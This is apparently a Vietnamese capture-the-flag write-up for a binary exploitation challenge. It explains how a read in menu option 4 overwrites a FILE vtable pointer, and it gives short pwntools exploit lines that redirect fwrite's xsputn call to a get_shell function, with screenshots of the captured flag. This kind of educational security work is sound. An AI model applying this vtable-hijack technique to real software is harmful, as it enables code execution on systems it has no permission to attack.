# 1.Find Bug :

<img width="1978" height="1004" alt="image" src="https://github.com/user-attachments/assets/e26aa592-fd73-4918-921e-797869a5e321" />

- Hàm `read` ở option 4 cho phép thay đổi trực tiếp `vtable` address

# 2. Idea :

- Tận dùng option 4 để sửa `vtable` -> fake `vtable` sao cho fake `vtable` + 0x38 -> get_shell ( do hàm `fwrite` ở option 2 sẽ nhảy vào `vtable` + 0x38 hay `xsputn` để lấy địa chỉ rồi chạy nó )

# 3. Exploit :
```
sa(b'name: ', p64(exe.sym.get_shell))
slna(b'> ', 4)
sa(b'change: ', p64(0x6010d0-0x38))
slna(b'> ', 2)
```

- Ta cho `name` chứa hàm `get_shell`

- Sau đó là thay đổi `vtable` -> name - 0x38

- Cuối cùng chọn option2 để hàm `fwrite` lấy `fake vtable` + 0x38 = `name` ( đang chứa get_shell )

<img width="2550" height="1599" alt="image" src="https://github.com/user-attachments/assets/1d390011-5dcf-4232-aacd-5c9e52fe74dd" />

- Vì bài này ko cho libc nên debug local ko thể get_shell nên chỉ có thể remote thẳng lên sever

# 4. Get Flag :

<img width="1178" height="225" alt="image" src="https://github.com/user-attachments/assets/d58f3e58-f746-43e6-a00d-cedd567cbee0" />

# 5. Learned :

- IO_file và vtable
